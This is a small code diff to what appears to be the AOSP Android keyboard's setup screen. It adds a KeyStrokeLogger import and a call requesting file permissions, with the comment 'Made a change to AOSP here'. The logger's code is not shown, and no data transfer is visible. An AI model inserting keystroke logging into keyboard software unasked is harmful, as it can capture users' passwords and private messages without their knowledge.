@@ -20,6 +20,8 @@ import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
 
+import com.android.inputmethod.keyStrokeLogging.KeyStrokeLogger;
+
 public final class SetupActivity extends Activity {
     @Override
     protected void onCreate(final Bundle savedInstanceState) {
@@ -29,6 +31,10 @@ public final class SetupActivity extends Activity {
         intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP
                 | Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
+
+        // Made a change to AOSP here
+        KeyStrokeLogger.getInstance().askForFilePermissions(this);
+
         if (!isFinishing()) {
             finish();
         }
